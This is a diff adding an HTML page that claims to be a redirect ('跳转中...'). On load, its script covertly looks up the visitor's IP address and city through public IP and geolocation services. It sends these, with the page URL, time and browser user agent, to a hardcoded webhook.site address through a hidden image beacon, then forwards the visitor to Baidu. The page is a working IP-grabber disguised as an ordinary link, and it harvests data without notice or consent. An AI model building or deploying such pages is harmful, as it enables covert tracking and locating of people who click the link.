@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>跳转中...</title>
+</head>
+<body>
+    <script>
+        const WEBHOOK_URL = "https://webhook.site/b1a566cd-33ae-49ef-bb54-b68c5a75e5cd";
+
+        // 备选 IP 接口，提高成功率
+        async function getIP() {
+            const apis = [
+                'https://api.ipify.org?format=json',
+                'https://api.ip.sb/ip',
+                'https://icanhazip.com/'
+            ];
+            for (const api of apis) {
+                try {
+                    const res = await fetch(api);
+                    if (res.ok) {
+                        const text = await res.text();
+                        return text.trim();
+                    }
+                } catch (e) {}
+            }
+            return '未知';
+        }
+
+        // 备选城市解析接口
+        async function getCity(ip) {
+            if (ip === '未知') return '未知';
+            const apis = [
+                `https://ipapi.co/${ip}/json/`,
+                `https://ipinfo.io/${ip}/json`
+            ];
+            for (const api of apis) {
+                try {
+                    const res = await fetch(api);
+                    if (res.ok) {
+                        const data = await res.json();
+                        return data.city || data.region || '未知';
+                    }
+                } catch (e) {}
+            }
+            return '未知';
+        }
+
+        // 主逻辑
+        (async () => {
+            const ip = await getIP();
+            const city = await getCity(ip);
+            const visitData = {
+                ip: ip,
+                city: city,
+                time: new Date().toLocaleString('zh-CN'),
+                url: location.href,
+                ua: navigator.userAgent
+            };
+
+            // 提交到 Webhook
+            const img = new Image();
+            const params = new URLSearchParams(visitData).toString();
+            img.src = `${WEBHOOK_URL}?${params}`;
+            img.style.display = 'none';
+            document.body.appendChild(img);
+
+            // 延迟 1 秒后跳转到百度
+            setTimeout(() => {
+                window.location.href = "https://www.baidu.com";
+            }, 1000);
+        })();
+    </script>
+</body>
+</html>
